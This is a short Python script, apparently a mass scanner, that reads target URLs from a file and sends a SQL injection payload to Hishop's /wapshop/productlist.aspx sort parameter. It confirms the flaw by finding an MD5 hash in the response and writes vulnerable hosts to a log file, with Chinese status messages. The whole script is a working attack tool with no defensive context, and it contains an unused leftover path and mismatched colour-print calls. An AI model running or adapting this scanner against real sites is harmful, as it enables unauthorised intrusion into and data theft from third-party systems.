import sys
import json
import requests
import warnings
from termcolor import cprint


urls = open('url.txt')

poc = '/index.php/api/Uploadify/preview'



for i in urls:
    url = i.rstrip("\n")
    payload = "/wapshop/productlist.aspx?sort=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27)))"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)

        if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
            print("[+]存在Hishop SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('SQL注入.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在hishop_productlist_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")